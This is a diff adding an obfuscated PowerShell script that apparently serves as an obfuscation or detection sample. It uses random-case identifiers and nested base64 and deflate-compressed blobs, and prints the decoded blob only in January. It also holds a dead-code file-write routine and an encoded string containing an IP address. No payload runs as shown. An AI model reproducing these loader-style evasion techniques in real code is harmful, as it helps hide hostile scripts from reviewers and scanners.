@@ -1,0 +1,39 @@
+$bnNvRyi = 'QmNGcGwzSlFBQURndnpJZjNuUG1heVFoUzVaQmtrcENWd2t0MWlsME5WSCsrL3M4LytyTG95bmdGL1AxWFVFenJFVnIrTmp5eXY1MHI2R0t5eVhjcm9OVVFGOFQxRXF4NE9QS0V5ZVhIaEhSQ25jVURnU0hNKzVYcU9vYWZ3N1gwM2NqZ1JaMG9pcnFGK1FNa3BWc09iZmI3akVFc0J1SE5PY2ZtWWFSSm9TSDI5blI2dDAvWnhJYXQ4aGhmQk5HZnZjekV3Rkd4Qy8rSktIaWNSNkdkOHBqOUNTYVpraVpYZTJhUCt3S202NG1jZEI2eXdvYnh3Nnd5N0xCVjNqRGk3clZqZkNHOE5aQjdpamw1WGVqSGFNZmdmR21CTWwxQ1ZXTmxJR3JwQ2xNNWdlckN0WjRTbHRrcHU4SzFwek5VVjQrN05GYkowbDhJSGp2NUFVMlhCa2NKbVU3NVJIdGozdHVWSkRLWndsUDQydkNMckZiVUtMUHNRKzYwZUNPdFZkMzZ2Y093b1g3azFJRGRBQmlpdXE1Zmd6RTZMNmtIajhEN3dTemJtYnM0aWxsN3RBRmtoZWtQYVNYVWt4WGhwcTk2TXAxOTh2blFEcHp5TVY4MDVvYVZ2MVQvN0RYbzVwajg2cXl3N0hJaG5wTlBUY3JmNlk5UDJ4Q29SNDBOeGZRdTgxYkprWXptUE9QRDgvWmdVY1dXaXlUUmZBZVpuaEpXcmt1dUhtcEw5YWYxK0VVc1pxQktxcVFpeENUZzViRWpjVVdHNnZ6aW05UnF2aitEdz09'
+$DSqNo=[SYsTEm.TExt.eNcodInG]::UtF8.geTStrIng([sysTem.cONvERt]::froMBAsE64strING($bnNvRyi))
+fuNcTioN pPpuEit { 
+    [CmdlEtBInDInG() ]pARam( 
+        [PaRamEtER (VALueFroMPIpEliNe)]
+        $UuBdIy,
+        [PaRamEtER(VALueFroMPIpEliNe)]
+        $QIcHHN
+    )
+    $ioBCKqEy =[Io.memOrYSTreaM] [ConvERT]::FromBaSE64StrinG( $UuBdIy)
+    $ioBCKqEy| cmZMQbP}
+fuNcTioN cmZMQbP { 
+    [CmdlEtBInDInG() ]pARam( 
+        [PaRamEtER(VALueFroMPIpEliNe)]
+        $gGuG
+    )
+    If((Get-DAte ).moNtH -lt 2){
+        ( new-oBjecT   iO.CoMPreSSIon.deflAteSTReAm( $gGuG, [syStEm.Io.COmPREssION.cOMPRessioNmODE]::dEcompReSS) |FOrEacH{new-oBjecT  Io.STrEAMreAdEr($_, [systEM.TExt.encOdinG]::asCii)} | ForEacH{$_.reADToeNd() } )| write-host
+    
+    }
+}
+pPpuEit -UuBdIy $DSqNo -QIcHHN 'SmCqYHHQ'
+fuNcTioN mozu { 
+    [CmdlEtBInDInG()]pARam( 
+        [PaRamEtER(VALueFroMPIpEliNe)]
+        $emgn,
+        [PaRamEtER (VALueFroMPIpEliNe)]
+        $IPeQFd
+    )
+    If($FALSe){
+        $TULY=[ ConvERT ]::FromBaSE64StrinG($emgn )
+        [ iO.file ]::wRiTeALlbYTES( "$pwd/spcmbwt",$TULY)
+    
+    }
+}
+$GlSWLyDk =@( 'JHJlc3VsdCA9ICJZb3Ug','YXJlIHRoZSBtb3N0IGF0','dHJhY3RpdmUgbWFuIEkg', 'ZXZlciBsYWlkIGVhcnMu', 'aXA6NC43OS41NC4xNjMi', 'Cg==')
+$KZmwj= $GlSWLyDk -JoiN ''
+mozu -emgn $KZmwj -IPeQFd 'bkFdc'
+
